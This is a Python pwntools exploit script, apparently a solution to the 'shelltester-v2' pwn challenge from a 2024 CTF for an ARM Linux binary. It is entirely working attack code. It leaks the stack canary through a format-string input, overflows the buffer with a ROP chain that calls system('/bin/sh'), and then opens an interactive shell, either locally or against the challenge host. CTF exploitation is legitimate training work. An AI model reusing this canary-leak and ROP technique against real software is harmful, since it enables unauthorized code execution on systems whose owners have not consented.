#!/usr/bin/env python3
from pwn import *
import os
import sys

context.update(
    arch='arm',
    endian='little',
    os='linux',
    log_level='debug',
    terminal=['tmux', 'split-window', '-h', '-p 65'],
)

REMOTE = False
TARGET = os.path.realpath('/ctf-writeups/CyberSpace CTF 2024/pwn/shelltester-v2/chall')
elf = ELF(TARGET)

def attach():
    if REMOTE:
        return

    bkps = []
    cmds = []

    return gdb.debug(TARGET, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))

def exploit(r):
    r.sendlineafter(b'something: \n', b'%43$p')

    canary = int(r.recvline().strip().decode(), 16)

    rop = ROP(elf)

    rop.raw(cyclic(0x64))
    rop.raw(canary)
    rop.raw(cyclic(4))
    rop.raw(0x6f25c) # pop {r0, pc}
    rop.raw(next(elf.search('/bin/sh')))
    rop.call(elf.sym.system)

    r.sendlineafter(b'leave?\n', rop.chain())
    r.interactive()
    return

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == 'remote':
        REMOTE = True
        r = remote('shelltesterv2.challs.csc.tf', 1337)
    else:
        REMOTE = False
        r = attach()

    exploit(r)
    exit(0)
